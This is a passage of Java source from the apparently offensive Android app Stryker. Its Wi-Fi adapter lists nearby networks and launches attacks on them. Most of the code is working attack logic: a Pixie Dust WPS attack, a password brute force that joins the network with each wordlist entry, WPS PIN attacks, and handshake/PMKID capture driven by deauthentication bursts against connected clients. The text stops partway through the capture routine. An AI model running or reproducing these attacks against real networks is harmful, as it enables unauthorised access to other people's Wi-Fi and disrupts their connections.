package com.zalexdev.stryker.wifi;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.text.Layout;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.AdvancedThread;
import com.zalexdev.stryker.utils.Core;
import com.zalexdev.stryker.utils.MonitorManager;
import com.zalexdev.stryker.utils.SimpleProcess;
import com.zalexdev.stryker.utils.Utils;
import com.zalexdev.stryker.wifi.attack.AttackKind;
import com.zalexdev.stryker.wifi.attack.AttackMetric;
import com.zalexdev.stryker.wifi.attack.AttackMonitor;
import com.zalexdev.stryker.wifi.attack.AttackStage;
import com.zalexdev.stryker.wordlists.Wordlist;
import com.zalexdev.stryker.wordlists.WordlistCategory;
import com.zalexdev.stryker.wordlists.WordlistPickerDialog;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
    public ArrayList<WiFINetwork> wifilist;
    public Context context;
    public Activity activity;
    public int tag = 0;
    public Timer deauth;
    public Core core;
    public volatile AdvancedProcess pixie = null;
    public volatile AdvancedProcess oneshot = null;
    public volatile AdvancedProcess deauther = null;
    public volatile AdvancedProcess brutepin = null;
    public volatile AdvancedThread handshake = null;
    public volatile AdvancedThread brutepsk = null;
    public volatile AdvancedProcess airodump = null;
    public Timer aireplay;
    public String pinconnect;
    public String wordlistpath;

    private static final String PREF_LAST_PSK_WORDLIST = "wifi_last_psk_wordlist";
    private static final Pattern MAC_TOKEN = Pattern.compile("(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}");

    private static final class Verdict {
        boolean handshake;
        boolean pmkid;
        boolean answered;
        String source = "";

        boolean usable() { return handshake || pmkid; }
    }

    private Verdict verifyCapture(String hostPath, String guestPath, String bssid) {
        Verdict v = new Verdict();

        try {
            java.io.File f = new java.io.File(hostPath);
            if (f.isFile() && f.length() > 24) {
                com.zalexdev.stryker.handshakes.CaptureInfo info =
                        com.zalexdev.stryker.handshakes.CaptureInfo.of(f);
                if (info.kind != com.zalexdev.stryker.handshakes.CaptureInfo.Kind.UNREADABLE) {
                    v.answered = true;
                    if (info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.HANDSHAKE) {
                        v.handshake = true;
                    }
                    if (info.pmkid
                            || info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.PMKID) {
                        v.pmkid = true;
                    }
                    if (v.usable()) v.source = "the capture itself";
                }
            }
        } catch (Throwable ignored) {
        }

        try {
            boolean haveBssid = bssid != null
                    && bssid.matches("(?i)([0-9a-f]{2}:){5}[0-9a-f]{2}");
            String cmd = "aircrack-ng " + (haveBssid ? "-b " + bssid + " " : "")
                    + com.zalexdev.stryker.wordlists.WordlistStore.quoteForShell(guestPath)
                    + " < /dev/null";
            for (String line : core.customChrootCommand(cmd, true)) {
                if (line == null) continue;
                if (line.contains("packets") || line.contains("networks found")
                        || line.contains("WPA") || line.contains("WEP")) {
                    v.answered = true;
                }
                java.util.regex.Matcher m = java.util.regex.Pattern
                        .compile("(\\d+)\\s+handshake").matcher(line);
                if (m.find()) {
                    try {
                        if (Integer.parseInt(m.group(1)) > 0) v.handshake = true;
                    } catch (NumberFormatException ignored) {
                    }
                }
                if (line.contains("PMKID")) v.pmkid = true;
            }
            if (v.usable() && v.source.isEmpty()) v.source = "aircrack-ng";
        } catch (Throwable ignored) {
        }

        return v;
    }

    private String newestCapture(String hsDir) {
        java.io.File[] caps = new java.io.File(hsDir)
                .listFiles((d, n) -> n.startsWith("handshake-") && n.endsWith(".cap"));
        java.io.File newest = null;
        if (caps != null) {
            for (java.io.File f : caps) {
                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
            }
        }
        if (newest != null) return newest.getName();
        if (core.isRootless()) return null;
        for (String line : core.customMegaCommand(
                "ls -1t '" + hsDir + "'/handshake-*.cap 2>/dev/null | head -n 1")) {
            if (line == null) continue;
            String t = line.trim();
            if (t.startsWith("/") && t.endsWith(".cap")) {
                return t.substring(t.lastIndexOf('/') + 1);
            }
        }
        return null;
    }

    private String archiveCapture(String captureDir, String filename) {
        String safe = filename.replaceAll("[^A-Za-z0-9._-]", "_");
        if (safe.length() > 120) safe = safe.substring(safe.length() - 120);
        String dest = captureDir + "/" + safe;
        String hsDir = core.getShareRoot() + "/hs";
        new java.io.File(captureDir).mkdirs();

        java.io.File[] caps = new java.io.File(hsDir)
                .listFiles((d, n) -> n.startsWith("handshake-") && n.endsWith(".cap"));
        java.io.File newest = null;
        if (caps != null) {
            for (java.io.File f : caps) {
                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
            }
        }
        if (newest != null) {
            core.moveFile(newest.getAbsolutePath(), dest);
            if (new java.io.File(dest).isFile()) return dest;
        }
        if (core.isRootless()) return null;

        core.customMegaCommand("mkdir -p '" + captureDir + "'; "
                + "src=$(ls -1t '" + hsDir + "'/handshake-*.cap 2>/dev/null | head -n 1); "
                + "if [ -n \"$src\" ]; then mv -f \"$src\" '" + dest + "'; fi");
        return new java.io.File(dest).isFile() ? dest : null;
    }


    public WiFIAdapter(Context context2, Activity mActivity, ArrayList<WiFINetwork> wifi) {
        context = context2;
        wifilist = wifi;
        activity = mActivity;
        try {wifi.sort(new WiFINetwork.WiFIComporator());}
        catch (Exception ignored){}
        core = new Core(context2);
        com.zalexdev.stryker.engine.WifiEngine.bindFor(core, core.getString("wlan_wifi"));

    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View v = LayoutInflater.from(context).inflate(R.layout.wifi_item, parent, false);
        return new ViewHolder(v);
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onBindViewHolder(@NonNull ViewHolder adapter, @SuppressLint("RecyclerView") final int position) {
        WiFINetwork wifi = wifilist.get(position);

        String mac = wifi.getMac();
        if (!core.getBoolean("hide")) {
            adapter.wifi_mac.setText(mac == null ? "" : mac.toUpperCase(Locale.ROOT));
        } else {
            adapter.wifi_mac.setText(Core.HIDDEN_MAC);
        }
        adapter.wifi_name.setText(wifi.getSsid());
        adapter.wifi_name.setSelected(true);

        adapter.five_mark.setVisibility(View.GONE);
        adapter.wps_mark.setVisibility(View.GONE);
        adapter.lock_mark.setVisibility(View.GONE);
        adapter.pixie_mark.setVisibility(View.GONE);
        adapter.key_mark.setVisibility(View.GONE);

        int signalPercent = Math.max(0, Math.min(100, 100 - wifi.getPower()));
        adapter.wifi_power.setText(signalPercent + "%");
        adapter.wifi_power.setTextColor(signalColor(signalPercent));
        if (adapter.icon != null) {
            adapter.icon.setColorFilter(signalColor(signalPercent));
        }

        if (wifi.getIs5hhz()) {
            adapter.five_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getWps() && !wifi.getBlocked()) {
            adapter.wps_mark.setVisibility(View.VISIBLE);
        } else if (wifi.getBlocked()) {
            adapter.lock_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getOK()) {
            adapter.key_mark.setVisibility(View.VISIBLE);
        }
        String vendor = wifi.getVendor();
        adapter.wifi_model.setText(vendor == null || vendor.isEmpty()
                ? context.getString(R.string.wifi_card_unknown_vendor)
                : vendor);
        if (wifi.getModel() != null && wifi.getModel().length() > 0) {
            adapter.wifi_model.setText(context.getString(R.string.wifi_card_model, wifi.getModel()));
            if (wifi.isVulnVerified()) {
                adapter.pixie_mark.setText(R.string.wifi_chip_pixie_verified);
                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFE65100));
                adapter.pixie_mark.setTextColor(0xFFFFFFFF);
                adapter.pixie_mark.setVisibility(View.VISIBLE);
            } else if (wifi.isVulnerable()) {
                adapter.pixie_mark.setText(R.string.wifi_chip_pixie);
                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFFFE0B2));
                adapter.pixie_mark.setTextColor(0xFFE65100);
                adapter.pixie_mark.setVisibility(View.VISIBLE);
            }
        }

        if (adapter.divider != null) {
            adapter.divider.setVisibility(position == wifilist.size() - 1 ? View.GONE : View.VISIBLE);
        }

        adapter.card.setOnClickListener(view -> newWifiDialog(wifilist.get(position)));
    }

    private int signalColor(int percent) {
        if (percent >= 65) return android.graphics.Color.parseColor("#2E7D32");
        if (percent >= 40) return android.graphics.Color.parseColor("#F57C00");
        return android.graphics.Color.parseColor("#C62828");
    }
    public void resizeImage(ImageView imageView, ProgressBar circle, boolean s) {
        if (s) {
        core.scale(imageView,0.65F);
        core.scale(circle,1.0F);}
        else {
            core.scale(imageView,1.0F);
            core.scale(circle,0.0F);
        }
    }


    @Override
    public int getItemCount() {
        return wifilist.size();
    }
    public void newWifiDialog(WiFINetwork network){
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.new_wifi_dialog);
        android.view.Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }

        dialog.setCancelable(true);
        TextView name = dialog.findViewById(R.id.ssid);
        TextView mac = dialog.findViewById(R.id.mac);
        TextView model = dialog.findViewById(R.id.model);
        TextView info_text = dialog.findViewById(R.id.additional_text);
        ImageView info_image = dialog.findViewById(R.id.additional_img);
        LinearLayout wps_divider = dialog.findViewById(R.id.wps_divider);
        MaterialCardView pixie = dialog.findViewById(R.id.pixie_dust);
        MaterialCardView deauther = dialog.findViewById(R.id.deauth);
        MaterialCardView try_handshake = dialog.findViewById(R.id.handshake_capture);
        MaterialCardView custom_pin = dialog.findViewById(R.id.custom_pin);
        MaterialCardView null_pin = dialog.findViewById(R.id.null_pin);
        MaterialCardView brute_psk = dialog.findViewById(R.id.pass_bruteforce);
        MaterialCardView brute_pincode = dialog.findViewById(R.id.pin_bruteforce);
        MaterialCardView common_pins = dialog.findViewById(R.id.common_pins);
        MaterialCardView pmkid_capture = dialog.findViewById(R.id.pmkid_capture);
        MaterialCardView info = dialog.findViewById(R.id.additional_info);
        MaterialCardView wps_lock = dialog.findViewById(R.id.wps_locked);

        pmkid_capture.setOnClickListener(view -> {
            new MaterialAlertDialogBuilder(context)
                    .setTitle("PMKID Capture")
                    .setMessage("Pmkid capture are included into HS Capture attack. Please use HS Capture instead of PMKID Capture.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> {
                        dialog1.dismiss();
                    })
                    .setNegativeButton(android.R.string.cancel, (dialog12, which) -> dialog12.dismiss())
                    .show();
        });
        if (!network.getBlocked()){
            wps_lock.setVisibility(View.GONE);
        }
        else {
            wps_lock.setVisibility(View.VISIBLE);
        }
        if (!network.getWps()){
            wps_lock.setVisibility(View.GONE);
            wps_divider.setVisibility(View.GONE);
        }

        wps_lock.setOnClickListener(view -> {
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("WPS Locked")
                    .setMessage("Stryker detected that this network is WPS Locked. This means that you can't use WPS to connect to this network. You can still try wps attacks, but they will fail.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            d.show();
        });


        name.setText(network.getSsid());
        if (core.getBoolean("hide")){
            mac.setText(Core.HIDDEN_MAC);
        }else{
            mac.setText(network.getMac().toUpperCase(Locale.ROOT));
        }

        info.setOnClickListener(v -> {
            StringBuilder info1 = new StringBuilder();
            if (network.getOK()){
                info1.append("===============\n\nStored Password: ").append(network.getPsk()).append("\n\n===============\n\n\n");
            }
            for (String s : network.getInfo()){
                info1.append(s.trim().replace("*","    -")).append("\n");
            }
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("Additional info")
                    .setMessage(info1)
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            if(network.getOK()){
                d.setNeutralButton("Copy psk", (dialog1, which) -> {
                    ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("password", network.getPsk());
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(context, "Password copied to clipboard", Toast.LENGTH_SHORT).show();
                    dialog1.dismiss();
                });
            }
            d.setNegativeButton("Copy", (dialog1, which) -> {
                ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("info", info1);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(context, "Info copied to clipboard", Toast.LENGTH_SHORT).show();
                dialog1.dismiss();
            });
            d.show();

        });

        if (network.getSsid().contains("Hidden network")){brute_psk.setVisibility(View.GONE);}

        if (network.getModel()!=null){
            model.setText(network.getModel());
        }else {
            model.setVisibility(View.GONE);
        }
        pixie.setOnClickListener(view -> {
            attackDialog(network,1);
        });
        brute_psk.setOnClickListener(view -> {
            attackDialog(network,2);
        });
        try_handshake.setOnClickListener(view -> {
            attackDialog(network,3);
        });
        brute_pincode.setOnClickListener(view -> {
            attackDialog(network,4);
        });
        custom_pin.setOnClickListener(view -> {
            attackDialog(network,5);
        });
        null_pin.setOnClickListener(view -> {
            attackDialog(network,8);
        });
        common_pins.setOnClickListener(view -> {

            attackDialog(network,6);
        });
        deauther.setOnClickListener(view -> {
            attackDialog(network, 7);
        });


        dialog.show();

        }

    private ArrayList<String> readPinCandidates(Wordlist wordlist) {
        ArrayList<String> out = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new FileReader(wordlist.file))) {
            String line;
            while ((line = br.readLine()) != null) out.add(line);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return out;
    }

    private static AttackKind kindFor(int type) {
        switch (type) {
            case 2:  return AttackKind.PSK_BRUTE;
            case 3:  return AttackKind.HANDSHAKE;
            case 4:  return AttackKind.WPS_PIN_BRUTE;
            case 5:  return AttackKind.WPS_PIN_ONE;
            case 6:  return AttackKind.WPS_PIN_LIST;
            case 7:  return AttackKind.DEAUTH_ONE;
            case 8:  return AttackKind.WPS_PIN_NULL;
            case 1:
            default: return AttackKind.PIXIE_DUST;
        }
    }

    private String targetMeta(WiFINetwork network) {
        StringBuilder sb = new StringBuilder();
        sb.append(core.getBoolean("hide")
                ? Core.HIDDEN_MAC
                : String.valueOf(network.getMac()).toUpperCase(Locale.ROOT));
        if (network.getChannel() > 0) sb.append("  ch ").append(network.getChannel());
        sb.append(network.getIs5hhz() ? "  5 GHz" : "  2.4 GHz");
        sb.append("  ").append(Math.max(0, Math.min(100, 100 - network.getPower()))).append("%");
        if (network.getWps()) sb.append(network.getBlocked() ? "  WPS locked" : "  WPS");
        String model = network.getModel();
        if (model != null && !model.isEmpty()) sb.append('\n').append(model);
        return sb.toString();
    }

    private String masked(String line) {
        if (line == null || !core.getBoolean("hide")) return line;
        Matcher m = MAC_TOKEN.matcher(line);
        return m.find() ? line.replace(m.group(), Core.HIDDEN_MAC) : line;
    }

    private void offerConnect(AttackMonitor monitor, WiFINetwork network, String psk) {
        monitor.primary(context.getString(R.string.auto_connect), () -> {
            monitor.primaryLabel("Connecting…");
            core.connectWiFi2(network.getSsid(), psk);
            core.connectWiFi2(network.getSsid(), psk);
            new Thread(() -> {
                long end = System.currentTimeMillis() + 20000;
                while (System.currentTimeMillis() < end) {
                    if (checkIsSsidConnected(network.getSsid())) {
                        activity.runOnUiThread(() -> monitor.primaryLabel("Connected"));
                        return;
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        return;
                    }
                }
                activity.runOnUiThread(() -> {
                    monitor.primaryLabel(context.getString(R.string.auto_connect));
                    core.toaster("The network wait time was longer than expected.");
                });
            }).start();
        });
    }

    public void attackDialog(WiFINetwork network, int type){

        final AttackKind kind = kindFor(type);
        final AttackMonitor monitor = AttackMonitor.open(activity, core, kind,
                network.getSsid(), targetMeta(network));
        final AtomicBoolean dialogCanceled = new AtomicBoolean(false);

        monitor.onStop(() -> {
            dialogCanceled.set(true);
            if (pixie != null) {pixie.kill();}
            if (handshake != null) {handshake.setCanceled(true);}
            if (oneshot != null) {oneshot.kill();}
            if (brutepsk != null) {brutepsk.setCanceled(true);}
            if (brutepin != null) {brutepin.kill();}
            if (deauther != null) {deauther.kill();}
            if (airodump != null) {airodump.kill();}
            try{
                aireplay.cancel();
            }catch (Exception ignored){

            }
            monitor.finish(false, "Attack stopped");
            new Thread(() -> {
                String hsIface = core.getHSInterface();
                String deauthIface = core.getDeauthInterface();
                boolean hsMon = core.monitorManager.isMonitorModeEnabled(hsIface);
                boolean deauthMon = !deauthIface.equals(hsIface)
                        && core.monitorManager.isMonitorModeEnabled(deauthIface);
                if (hsMon || deauthMon) {
                    core.toaster(activity, "Disabling monitor mode...");
                }
                if (hsMon) core.monitorManager.disableMonitorMode(hsIface);
                if (deauthMon) core.monitorManager.disableMonitorMode(deauthIface);
                restoreWpsInterface();
            }).start();
        });

        if (type == 1){
            final int[] scanCount = {0};
            monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                    + core.wpsIfaceDownFlag() + " -K -F -b " + network.getMac();
            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
            pixie = new AdvancedProcess(activity, context, cmd, true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    restoreWpsInterface();
                    WiFINetwork result = pixie(outputList);
                    if (result.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),result.getPsk(),result.getPin(),network.ssid);
                        }
                        com.zalexdev.stryker.geomac.GeoHooks.recordPixie(
                                context, network.getMac(), network.ssid);
                        monitor.stage(AttackStage.PIXIE, AttackStage.State.DONE, "Pin recovered offline");
                        monitor.finish(true, context.getResources().getString(R.string.pass) + " "
                                + result.getPsk() + "\n"
                                + context.getResources().getString(R.string.piin) + " " + result.getPin());
                        offerConnect(monitor, network, result.getPsk());
                    }else if (Core.contains(outputList,"Unable to up interface") || Core.contains(outputList,"No such device")){
                        monitor.failStage(AttackStage.RADIO, "Interface would not come up",
                                "Please change interface before attacking");
                    }else if (dialogCanceled.get()){
                        monitor.finish(false, "Attack stopped");
                    }else {
                        monitor.finish(false, context.getResources().getString(R.string.not_vuln_pixie));
                    }
                }

                @Override
                public void onNewLine(String line) {

                    if (line.contains("WPA PSK:")){
                        kill();
                    }
                    if (line.contains("Associating with AP…")){
                        scanCount[0]++;
                    }
                    if (scanCount[0] > 3){
                        monitor.stage(AttackStage.WPS, AttackStage.State.FAILED,
                                "Router is in push-button mode");
                        kill();
                    }
                    monitor.wps(masked(line));
                }

                @Override
                public void onEvent(String line) {

                }
            };

        }
        else if (type == 2){
            WiFINetwork result = new WiFINetwork();
            WordlistPickerDialog.show(context, activity, core,
                    context.getString(R.string.select_word2),
                    new WordlistCategory[] { WordlistCategory.WIFI, WordlistCategory.PASSWORD },
                    core.getString(PREF_LAST_PSK_WORDLIST),
                    picked -> {
                            core.putString(PREF_LAST_PSK_WORDLIST, picked.getName());
                            wordlistpath = picked.file.getAbsolutePath();
                            monitor.target(network.getSsid(),
                                    targetMeta(network) + "\n" + picked.getName());
                            monitor.stage(AttackStage.WORDLIST, AttackStage.State.ACTIVE);
                            brutepsk = new AdvancedThread(activity, context) {
                                @Override
                                public void onFinished() {
                                    if (result.getOK()){
                                        monitor.stage(AttackStage.TRY, AttackStage.State.DONE,
                                                "Association accepted");
                                        monitor.finish(true, context.getResources().getString(R.string.pass)
                                                + " " + result.getPsk());
                                        offerConnect(monitor, network, result.getPsk());
                                    }else {
                                        monitor.finish(false, "Password not found");
                                    }
                                }

                                @Override
                                public void eventListener(String line) {
                                    monitor.note(line);
                                }

                                @Override
                                public void doOnBackground() {
                                    final int total = countLines(wordlistpath);
                                    monitor.stage(AttackStage.WORDLIST, AttackStage.State.DONE,
                                            total > 0 ? total + " candidates" : null);
                                    monitor.stage(AttackStage.TRY, AttackStage.State.ACTIVE);
                                    final long began = System.currentTimeMillis();
                                    int tried = 0;
                                    try (BufferedReader br = new BufferedReader(new FileReader(wordlistpath))) {
                                        String psk;
                                        while ((psk = br.readLine()) != null) {
                                            if (this.canceled){break;}
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                createBruteNotification(context.getResources().getString(R.string.trying)+psk,0,1);
                                            }
                                            tried++;
                                            monitor.metric(AttackMetric.CANDIDATE, psk);
                                            monitor.metric(AttackMetric.PROGRESS,
                                                    total > 0 ? tried + " / " + total : String.valueOf(tried));
                                            sendEvent(context.getResources().getString(R.string.trying)+ psk);
                                            int netId = core.connectWiFi2(network.getSsid(), psk);
                                            try {
                                                Thread.sleep(6000);
                                            } catch (InterruptedException e) {
                                                e.printStackTrace();
                                            }
                                            reportPace(monitor, began, tried, total);
                                            if (checkIsSsidConnected(network.getSsid())) {
                                                result.setOK(true);
                                                result.setPsk(psk);
                                                result.setSsid(network.getSsid());
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                    createBruteNotification(context.getResources().getString(R.string.succes)+psk,1,1);
                                                }
                                                break;
                                            }else {
                                                core.deleteWifi(netId);
                                            }
                                        }
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }

                                @Override
                                public void onCanceled() {

                                }
                            };
                        });

        }
        else if (type == 3){

            Timer deauthtimer = new Timer();
            final boolean[] hsStatus = {false};
            final boolean[] pmkidStatus = {false};
            monitor.metric(AttackMetric.CHANNEL, network.getChannel() > 0
                    ? String.valueOf(network.getChannel()) : "any");
            handshake = new AdvancedThread(activity,context) {
                @Override
                public void onFinished() {
                    if (hsStatus[0]){
                        monitor.finish(true, "Handshake captured\nCheck Stryker/captured/");
                    }
                    else if (pmkidStatus[0]){
                        monitor.finish(true, "PMKID captured\nCheck Stryker/captured/");
                    }
                    else {
                        monitor.finish(false, "Handshake not captured");
                    }
                }

                @Override
                public void eventListener(String line) {
                    monitor.note(line);
                }

                @Override
                public void doOnBackground() {
                    boolean deauth = true;
                    boolean monitorOk;
                    boolean monitor2 = true;

                    String wlanscan = core.getHSInterface();
                    String deauthPref = core.getDeauthInterface();
                    if (!core.isRootless() && !core.isInternalDeauthEnabled()
                            && MonitorManager.isInternalRadio(deauthPref)){
                        if (!MonitorManager.isInternalRadio(wlanscan)) {
                            deauthPref = wlanscan;
                            sendEvent("Deauth interface is the internal radio — using " + wlanscan + " instead (enable 'Deauth with internal adapter' in Settings to use it)");
                        } else {
                            deauth = false;
                        }
                    }
                    final String wlandeauth = deauthPref;
                    sendEvent("Enabling monitor mode...");
                    monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, wlanscan);
                    monitorOk = core.monitorManager.enableMonitorMode(wlanscan, String.valueOf(network.getChannel()));
                    if (deauth && !wlanscan.equals(wlandeauth)){
                        monitor2 = core.monitorManager.enableMonitorMode(wlandeauth,String.valueOf(network.getChannel()));
                    }

                    final boolean[] airoRunning = {false};

                    if (monitorOk && monitor2){
                        monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE,
                                deauth && !wlanscan.equals(wlandeauth)
                                        ? wlanscan + " capturing, " + wlandeauth + " injecting"
                                        : wlanscan);
                        sendEvent("Starting airodump-ng...");
                        monitor.stage(AttackStage.CAPTURE, AttackStage.State.ACTIVE);
                        String guestShare = core.guestShare();
                        core.customChrootCommand("mkdir -p " + guestShare + "/hs " + guestShare + "/captured; "
                                + "rm -f " + guestShare + "/hs/handshake*");
                        final String capIface = core.getHSInterface();
                        if (canceled) return;
                        final int[] lockedChannel = {network.getChannel()};
                        new Thread(() -> {
                            if (canceled) return;
                            airodump = startAirodump(monitor, network, capIface, guestShare,
                                    lockedChannel[0], airoRunning, hsStatus, pmkidStatus,
                                    this::sendEvent);
                            if (canceled) airodump.kill();
                        }).start();
                        sendEvent("We are waiting for network to appear...");
                        monitor.stage(AttackStage.TARGET, AttackStage.State.ACTIVE, "Listening for beacons");
                        long appearDeadline = System.currentTimeMillis() + 60000;
                        while (!airoRunning[0] && !canceled && System.currentTimeMillis() < appearDeadline){
                            try {
                                Thread.sleep(1000);
                            } catch (InterruptedException e) {
                                break;
                            }
                        }
                        if (canceled) return;
                        if (!airoRunning[0]){
                            sendEvent("Target never showed up on this channel — aborting.");
                            if (airodump != null) airodump.kill();
                            monitor.failStage(AttackStage.TARGET, "No beacons in 60 seconds",
                                    "Target never appeared on channel " + network.getChannel());
                            setCanceled(true);
                            return;
                        }
                            sendEvent("Airodump-ng launched!");
                            if (!deauth){
                                sendEvent("Can`t deauth with (s)wlan0 interface! Passive mode!");
                                monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
                                        "Internal radio cannot inject — waiting passively");
                            }else{
                            sendEvent("Starting deauth...");}
                            final String deauthIface = core.monitorManager.isMonitorModeEnabled(wlandeauth + "mon")
                                    ? wlandeauth + "mon" : wlandeauth;
                            final String hsIface = capIface;
                            final boolean internalDeauth = !core.isRootless()
                                    && !core.isInternalDeauthEnabled()
                                    && MonitorManager.isInternalRadio(deauthIface);
                            final String[] lastRelock = {""};
                            monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE, "Waiting for a client to rejoin");
                            long phaseEnds = System.currentTimeMillis() + LISTEN_FIRST_MS;
                            boolean bursting = false;
                            final long[] burstStartedAt = {0L};
                            final int[] relockTo = {0};
                            int relocks = 0;
                            if (deauth) {
                                monitor.stage(AttackStage.DEAUTH, AttackStage.State.PENDING,
                                        "Listening " + (LISTEN_FIRST_MS / 1000)
                                                + "s first to find the clients");
                                monitor.metric(AttackMetric.STATE, "Listening");
                            }
                            while (!hsStatus[0] && !pmkidStatus[0] && !canceled){
                                    if (airodump != null && !airodump.isRunning()){
                                        sendEvent("airodump-ng stopped unexpectedly — aborting.");
                                        monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
                                                "airodump-ng stopped unexpectedly");
                                        break;
                                    }
                                    if (relockTo[0] > 0 && relockTo[0] != lockedChannel[0]
                                            && relocks < MAX_RELOCKS) {
                                        int to = relockTo[0];
                                        relockTo[0] = 0;
                                        relocks++;
                                        lockedChannel[0] = to;
                                        monitor.note("Target is on channel " + to
                                                + " — restarting the capture there");
                                        monitor.metric(AttackMetric.CHANNEL, to);
                                        if (deauther != null) {
                                            deauther.kill();
                                            deauther = null;
                                        }
                                        if (airodump != null) airodump.kill();
                                        airodump = startAirodump(monitor, network, capIface,
                                                guestShare, to, airoRunning, hsStatus,
                                                pmkidStatus, this::sendEvent);
                                        bursting = false;
                                        burstStartedAt[0] = 0L;
                                        phaseEnds = System.currentTimeMillis() + DEAUTH_QUIET_MS;
                                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.PENDING,
                                                "Re-listening on channel " + to);
                                        continue;
                                    }
                                    if (bursting && burstStartedAt[0] > 0L) {
                                        phaseEnds = burstStartedAt[0] + DEAUTH_BURST_MS;
                                    }
                                    if (deauth && System.currentTimeMillis() >= phaseEnds) {
                                        if (bursting) {
                                            if (deauther != null) {
                                                deauther.kill();
                                                deauther = null;
                                            }
                                            bursting = false;
                                            phaseEnds = System.currentTimeMillis() + DEAUTH_QUIET_MS;
                                            monitor.stage(AttackStage.DEAUTH, AttackStage.State.DONE,
                                                    "Quiet for " + (DEAUTH_QUIET_MS / 1000)
                                                            + "s so a client can rejoin");
                                            monitor.metric(AttackMetric.STATE, "Listening");
                                        } else {
                                            java.util.List<String> targets = monitor.clientList();
                                            burstStartedAt[0] = 0L;
                                            deauther = burstDeauth(monitor, network, deauthIface,
                                                    hsIface, internalDeauth, lastRelock,
                                                    relockTo, targets, burstStartedAt);
                                            bursting = true;
                                            phaseEnds = System.currentTimeMillis()
                                                    + DEAUTH_BEACON_GRACE_MS;
                                            monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE,
                                                    targets.isEmpty()
                                                            ? deauthIface + " · broadcast"
                                                            : deauthIface + " · "
                                                                    + Math.min(targets.size(),
                                                                            DEAUTH_MAX_CLIENTS)
                                                                    + " client(s)");
                                        }
                                    }
                                    try {
                                        Thread.sleep(250);
                                    } catch (InterruptedException e) {
                                        break;
                                    }
                            }
                            if (deauther != null) {
                            deauther.kill();
                            }
                            if (airodump != null) {
                            airodump.kill();
                            }
                            if (canceled) return;
                            if (!hsStatus[0] && !pmkidStatus[0]) {
                                sendEvent("Nothing was captured — no handshake and no PMKID.");
                                monitor.failStage(AttackStage.EAPOL,
                                        "No handshake and no PMKID",
                                        "The capture ended before a client rejoined, so there is"
                                                + " nothing to save.");
                                activity.runOnUiThread(this::onFinished);
